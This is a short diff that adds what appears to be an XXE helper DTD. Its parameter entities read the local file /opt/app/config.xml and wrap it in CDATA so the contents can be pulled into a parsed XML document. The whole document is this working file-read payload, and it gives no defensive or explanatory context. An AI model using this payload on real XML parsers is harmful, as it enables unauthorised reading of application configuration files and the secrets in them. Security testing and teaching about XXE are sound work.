@@ -1,0 +1,4 @@
+<!ENTITY % cdata_start "<![CDATA[">
+<!ENTITY % cdata_body SYSTEM "file:///opt/app/config.xml">
+<!ENTITY % cdata_end "]]>">
+<!ENTITY var "%cdata_start;%cdata_body;%cdata_end;">
